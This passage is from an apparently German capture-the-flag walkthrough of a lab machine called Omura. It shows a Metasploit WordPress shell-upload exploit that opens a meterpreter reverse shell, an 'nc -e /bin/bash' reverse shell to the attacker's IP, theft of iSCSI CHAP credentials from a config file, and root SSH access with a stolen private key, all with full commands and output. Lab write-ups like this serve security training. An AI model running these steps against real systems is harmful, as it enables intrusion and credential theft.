+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.2.127    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   WordPress</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">set PASSWORD dw42k25MiXT</span></div>
+                     <pre>PASSWORD => dw42k25MiXT</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">set RHOSTS wordpress.omura.hmv</span></div>
+                     <pre>RHOSTS => wordpress.omura.hmv</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">set username admin</span></div>
+                     <pre>username => admin</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(unix/webapp/wp_admin_shell_upload) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.127:4444
+[*] Authenticating with WordPress using admin:dw42k25MiXT...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/SQvtJNQTmI/oxcPMCwtjp.php...
+[*] Sending stage (39927 bytes) to 192.168.2.126
+[+] Deleted oxcPMCwtjp.php
+[+] Deleted SQvtJNQTmI.php
+[+] Deleted ../SQvtJNQTmI
+<span class="password">[*] Meterpreter session 1 opened (192.168.2.127:4444 -> 192.168.2.126:53888) at 2023-04-11 15:07:52 +0200</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Metasploit-Modul `exploit/unix/webapp/wp_admin_shell_upload` wird verwendet. Dieses Modul authentifiziert sich mit den Admin-Credentials, lädt eine Payload als Plugin hoch, führt sie aus und löscht sie anschließend. Die Optionen werden entsprechend gesetzt: `PASSWORD`, `RHOSTS` (der VHost `wordpress.omura.hmv`), `USERNAME`. Als Payload wird der Standard `php/meterpreter/reverse_tcp` verwendet, der auf der Angreifer-IP `192.168.2.127` auf Port `4444` lauscht.</p>
+             <p class="evaluation">**Bewertung:** Der Exploit ist erfolgreich! Metasploit meldet "Meterpreter session 1 opened". Dies bedeutet, dass eine interaktive Meterpreter-Shell (eine erweiterte Shell mit vielen eingebauten Funktionen) im Kontext des Webserver-Benutzers (`www-data`) auf dem Zielsystem etabliert wurde.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die Meterpreter-Session, um das System weiter zu enumerieren (`sysinfo`, `getuid`, `pwd`, `ls`, `ps`, `shell` für eine System-Shell) und nach Wegen zur Privilegieneskalation zu suchen.<br>**Empfehlung (Admin):** Sichern Sie das WordPress-Admin-Backend. Deaktivieren Sie die Möglichkeit, Plugins direkt hochzuladen, wenn dies nicht unbedingt erforderlich ist, und implementieren Sie stattdessen einen sichereren Deployment-Prozess.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt meterpreter">meterpreter > <span class="command">sysinfo</span></div>
+                    <pre>
+Computer    : omura.hmv
+OS          : Linux omura.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+Meterpreter : php/linux</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der `sysinfo`-Befehl in Meterpreter liefert grundlegende Systeminformationen.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt das Betriebssystem (Debian 5.10) und die Architektur.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fahren Sie mit der Enumeration fort, z.B. mit `getuid` und `shell`, um eine reguläre System-Shell zu erhalten.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <p class="comment">*(Hinweis: Die folgenden Abschnitte über manuelles Plugin-Upload scheinen ein alternativer, fehlgeschlagener Versuch oder eine nachträgliche Dokumentation zu sein, da der Metasploit-Exploit bereits erfolgreich war. Der Bericht folgt nun dem Weg über die (wahrscheinlich aus Meterpreter gespawnte) System-Shell.)*</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">www-data@omura:/tmp$ nc -e /bin/bash 192.168.2.127 9001</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -nlvp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.127] from (UNKNOWN) [192.168.2.126] 44378</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, aus dem `www-data`-Kontext (vermutlich aus einer durch Meterpreter geöffneten Shell) eine `nc -e` Reverse Shell zu starten.</p>
+              <p class="evaluation">**Bewertung:** Der Listener empfängt eine Verbindung, was darauf hindeutet, dass `nc -e` hier funktionierte oder ein anderer Mechanismus (wie der Metasploit-Payload selbst) diese Verbindung parallel aufbaute. Eine einfache Shell wurde erhalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">*
+                                               Stabilisiere Reverse Shell
+=</span></pre>
+                     <div class="prompt">python3 -c "import pty;pty.spawn('/bin/bash')"</div>
+                     <pre><span class="prompt">www-data@omura:/tmp$</span> <span class="command">export TERM=xterm</span>
+export TERM=xterm
+<span class="prompt">www-data@omura:/tmp$</span> <span class="command">^Z</span>
+zsh: suspended  nc -nlvp 9001
+
+<span class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]</span>
+<span class="prompt">└─#</span> <span class="command">stty raw -echo;fg</span>
+[1]  + continued  nc -nlvp 9001
+                               reset
+
+<span class="prompt">www-data@omura:/tmp$</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die erhaltene `nc`-Shell wird mit der Standardmethode stabilisiert.</p>
+              <p class="evaluation">**Bewertung:** Eine stabile `www-data`-Shell steht nun zur Verfügung.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (www-data -> root via iSCSI)</h2>
+             <p class="analysis">**Analyse:** Als `www-data` wird nach Möglichkeiten zur Root-Eskalation gesucht. Der Fokus liegt auf dem iSCSI-Dienst.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@omura:/tmp$ <span class="command">sudo -l</span></div>
+                     <pre>
+[...]
+[sudo] password for www-data:
+<span class="password">sudo: a password is required</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `sudo -l` erfordert ein Passwort, das nicht bekannt ist.</p>
+              <p class="evaluation">**Bewertung:** Sudo ist keine direkte Option für `www-data`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@omura:/tmp$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
+LISTEN   0        80             <span class="command">127.0.0.1:3306</span>          0.0.0.0:*      <span class="comment"><-- MySQL lokal</span>
+LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      <span class="comment"><-- SSH</span>
+LISTEN   0        256              0.0.0.0:3260          0.0.0.0:*      <span class="comment"><-- iSCSI</span>
+LISTEN   0        511                    *:80                  *:*      <span class="comment"><-- Apache/Nginx</span>
+LISTEN   0        128                 [::]:22               [::]:*      <span class="comment"><-- SSH IPv6</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `ss -altpn` listet die lauschenden TCP-Ports auf.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt die von Nmap gefundenen Ports (22, 80, 3260) und zeigt zusätzlich einen MySQL-Server auf Port 3306, der nur lokal erreichbar ist (127.0.0.1). Die WordPress-Credentials (`admin`:`dw42k25MiXT`) könnten für diesen MySQL-Server gültig sein.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Der iSCSI-Dienst ist weiterhin interessant. Versuchen Sie, Konfigurationsdateien für iSCSI zu finden, die möglicherweise Credentials enthalten.<br>**Empfehlung (Admin):** Beschränken Sie den Zugriff auf Datenbanken auf notwendige Benutzer und Hosts.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@omura:/tmp$ <span class="command">man targetcli</span></div> <span class="comment"><-- Recherche --></span>
+                     <div class="prompt">www-data@omura:/tmp$ <span class="command">cd /etc/rtslib-fb-target/</span></div>
+                     <div class="prompt">www-data@omura:/etc/rtslib-fb-target$ <span class="command">ls -la</span></div>
+                     <pre>ls: cannot open directory '.': <span class="password">Permission denied</span></pre>
+                     <div class="prompt">www-data@omura:/etc/rtslib-fb-target$ <span class="command">cp saveconfig.json /tmp</span></div> <span class="comment"><-- Kopieren funktioniert? --></span>
+                     <div class="prompt">www-data@omura:/etc/rtslib-fb-target$ <span class="command">cat /tmp/saveconfig.json</span></div>
+                     <pre>
+              "chap_password": "<span class="password">gTQynqDRAyqvny7AbpeZ1Vi6e</span>",
+              "chap_userid": "<span class="password">root</span>",
+              "mapped_luns": [
+                {
+                  "alias": "a8a39c9925",
+                  "index": 0,
+                  "tpg_lun": 0,
+                  "write_protect": false
+       }
+              ],
+              "node_wwn": "<span class="command">iqn.2023-02.omura.hmv:node01.initiator01</span>" <span class="comment"><-- Erlaubter Initiator --></span>
+            }
+          ],
+[...]</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Nach Recherche (`man targetcli`) wird das iSCSI-Konfigurationsverzeichnis `/etc/rtslib-fb-target/` anvisiert. Obwohl `ls -la` fehlschlägt, gelingt es `www-data`, die Konfigurationsdatei `saveconfig.json` nach `/tmp` zu kopieren und deren Inhalt auszulesen.</p>
+              <p class="evaluation">**Bewertung:** Ein entscheidendes Informationsleck aufgrund falscher Dateiberechtigungen! Die `saveconfig.json` enthält im Klartext:
+*   Den CHAP-Benutzernamen: `root`
+*   Das CHAP-Passwort: `gTQynqDRAyqvny7AbpeZ1Vi6e`
+*   Den erlaubten Initiator-Namen (WWN): `iqn.2023-02.omura.hmv:node01.initiator01`</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie diese Informationen, um von Ihrer Angreifer-Maschine aus eine Verbindung zum iSCSI-Target herzustellen:
+    1.  Installieren Sie den `open-iscsi`-Client.
+    2.  Konfigurieren Sie Ihren lokalen Initiator-Namen auf den erlaubten Wert.
+    3.  Konfigurieren Sie die CHAP-Credentials (`root` / `gTQynqDRAyqvny7AbpeZ1Vi6e`).
+    4.  Entdecken und verbinden Sie sich mit dem iSCSI-Target.
+    5.  Mounten Sie das bereitgestellte Laufwerk und suchen Sie nach sensiblen Daten (z.B. SSH-Schlüssel).<br>
+**Empfehlung (Admin):** Korrigieren Sie sofort die Dateiberechtigungen für `/etc/rtslib-fb-target/saveconfig.json`, sodass sie nur von Root gelesen werden kann. Verwenden Sie starke, einzigartige CHAP-Passwörter.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">apt install open-iscsi</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nano /etc/iscsi/initiatorname.iscsi</span></div>
+                     <pre>InitiatorName=<span class="command">iqn.2023-02.omura.hmv:node01.initiator01</span></pre> <span class="comment"><-- Angepasst --></span>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nano /etc/iscsi/iscsid.conf</span></div>
+                     <pre>
+node.session.auth.authmethod = <span class="command">CHAP</span>
+[...]
+node.session.auth.username = <span class="command">root</span>
+node.session.auth.password = <span class="password">gTQynqDRAyqvny7AbpeZ1Vi6e</span></pre> <span class="comment"><-- Credentials eingetragen --></span>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">systemctl restart iscsid open-iscsi.service</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Auf der Angreifer-Maschine werden die notwendigen Schritte zur Konfiguration des iSCSI-Clients durchgeführt: `open-iscsi` installieren, den eigenen Initiator-Namen auf den erlaubten Namen setzen und die CHAP-Credentials in `iscsid.conf` eintragen. Der Dienst wird neu gestartet.</p>
+              <p class="evaluation">**Bewertung:** Korrekte Vorbereitung auf der Angreiferseite, um sich am iSCSI-Target zu authentifizieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">iscsiadm -m discovery -t sendtargets -p omura.hmv</span></div>
+                     <pre><span class="command">192.168.2.126:3260,1 iqn.2023-02.omura.hmv:target01</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">iscsiadm -m node --login</span></div>
+                     <pre>
+Logging in to [iface: default, target: iqn.2023-02.omura.hmv:target01, portal: 192.168.2.126,3260]
+Login to [iface: default, target: iqn.2023-02.omura.hmv:target01, portal: 192.168.2.126,3260] <span class="password">successful.</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der `iscsiadm`-Befehl wird verwendet, um zuerst das Ziel zu entdecken (`discovery`) und sich dann damit zu verbinden (`login`).</p>
+              <p class="evaluation">**Bewertung:** Das Discovery findet das Target, und der Login ist erfolgreich. Das iSCSI-Laufwerk ist nun auf der Angreifer-Maschine verfügbar.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Prüfen Sie mit `lsblk` oder `fdisk -l`, welches neue Gerät hinzugefügt wurde.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">lsblk</span></div>
+                     <pre>
+NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+sda      8:0    0 203,5G  0 disk
+├─sda1   8:1    0 202,5G  0 part /
+├─sda2   8:2    0     1K  0 part
+└─sda5   8:5    0   975M  0 part [SWAP]
+<span class="command">sdb      8:16   0     5M  0 disk</span> <span class="password"><-- Neues iSCSI Laufwerk! --></span>
+sr0     11:0    1  1024M  0 rom</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `lsblk` zeigt die verfügbaren Blockgeräte an.</p>
+              <p class="evaluation">**Bewertung:** Ein neues Gerät `/dev/sdb` mit einer Größe von 5MB ist sichtbar. Dies ist das gemountete iSCSI-Laufwerk.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie ein Mount-Verzeichnis und mounten Sie `/dev/sdb`.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mkdir disk</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mount /dev/sdb disk</span></div>
+                      <pre><span class="comment">*</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd disk</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~/disk]
+└─# <span class="command">ls -la</span></div>
+                      <pre>
+insgesamt 28
+drwxr-xr-x  2 root root  1024 11. Feb 19:01 .
+drwx------ 18 root root 20480 11. Apr 15:55 ..
+<span class="command">-rw-------  1 root root  2602 11. Feb 19:01 id_rsa</span> <span class="password"><-- Privater SSH-Schlüssel! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Das iSCSI-Laufwerk `/dev/sdb` wird in das Verzeichnis `~/disk` gemountet. Der Inhalt wird aufgelistet.</p>
+              <p class="evaluation">**Bewertung:** Das Laufwerk enthält eine einzelne Datei: `id_rsa`. Die Berechtigungen (`-rw-------`) und der Name deuten stark darauf hin, dass dies der private SSH-Schlüssel des Root-Benutzers ist!</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Kopieren Sie die `id_rsa`-Datei. Setzen Sie die Berechtigungen lokal auf `600`. Verwenden Sie diesen Schlüssel, um sich per SSH als `root` am Zielsystem anzumelden.<br>**Empfehlung (Admin):** Niemals private Schlüssel auf iSCSI-Laufwerken speichern, die über (potenziell unsichere) CHAP-Credentials zugänglich sind. Root-Login über SSH sollte idealerweise deaktiviert oder nur mit Schlüsseln erlaubt sein.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/disk]
+└─# <span class="command">cat id_rsa</span></div>
+                      <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">[...] (Langer Schlüsselblock für Root)</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/disk]
+└─# <span class="command">chmod 600 id_rsa</span></div> <span class="comment"><-- Berechtigungen lokal setzen --></span>
+                      <div class="prompt">┌──(root㉿cyber)-[~/disk]
+└─# <span class="command">ssh root@omura.hmv -i id_rsa</span></div>
+                      <pre>
+The authenticity of host 'omura.hmv (192.168.2.126)' can't be established.
+[...] <span class="comment">(Host Key Prompt)</span>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'omura.hmv' (ED25519) to the list of known hosts.
+Linux omura.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+[...] <span class="comment">(Login Banner)</span>
+<span class="prompt">root@omura:~#</span> <span class="password"><-- Root Login erfolgreich! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der private Schlüssel wird angezeigt. Die Berechtigungen werden lokal auf `600` gesetzt. Anschließend wird `ssh` verwendet, um sich als `root` am Zielsystem (`omura.hmv`) mit dem gefundenen Schlüssel (`-i id_rsa`) anzumelden.</p>
+              <p class="evaluation">**Bewertung:** Der Root-Login via SSH mit dem Schlüssel ist erfolgreich! Die Privilegieneskalation ist abgeschlossen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Lesen Sie die Root- und User-Flags.<br>**Empfehlung (Admin):** Der Root-SSH-Schlüssel ist kompromittiert und muss ausgetauscht werden. Deaktivieren Sie den Root-SSH-Login oder beschränken Sie ihn auf Schlüssel-Authentifizierung mit sicheren Schlüsseln. Beheben Sie das iSCSI-Credential-Leck.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">root@omura:~# <span class="command">cat root.txt</span></div>
+                      <pre><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></pre> <span class="comment"><-- Root Flag --></span>
+                      <div class="prompt">root@omura:~# <span class="command">cat /home/ford/user.txt</span></div>
+                      <pre><span class="password">cf7ddf6fa6393b8e7aef2396451fefdd</span></pre> <span class="comment"><-- User Flag --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Aus der Root-Shell werden die Root-Flag (`/root/root.txt`) und die User-Flag (`/home/ford/user.txt`) ausgelesen.</p>
+              <p class="evaluation">**Bewertung:** Beide Flags wurden erfolgreich gefunden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">umount disk</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">rm -rf comet disk</span></div> <span class="comment"><-- Comet? Wahrscheinlich Tippfehler oder anderes Verzeichnis --></span>
+                     <pre><span class="comment">
+                                                   Privilege Escalation erfolgreich</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird das gemountete iSCSI-Laufwerk ausgehängt (`umount`) und das Mount-Verzeichnis entfernt.</p>
+             <p class="evaluation">**Bewertung:** Aufräumarbeiten nach erfolgreicher Kompromittierung.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/ford/user.txt</div>
+                           <div class="flag-value"><span class="password">cf7ddf6fa6393b8e7aef2396451fefdd</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. April 2023</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
